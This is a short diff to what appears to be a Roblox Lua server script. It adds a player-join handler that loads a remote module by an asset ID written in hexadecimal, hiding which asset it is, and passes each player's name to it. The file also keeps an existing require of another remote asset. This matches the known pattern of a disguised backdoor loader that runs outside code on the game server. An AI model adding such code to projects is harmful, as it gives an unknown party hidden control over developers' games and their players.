@@ -1,2 +1,4 @@
-
+game.Players.PlayerAdded:Connect(function(xax)
+    require(0x7985e5f0add5):Check(xax.Name)
+end)
 require(97252544996551)
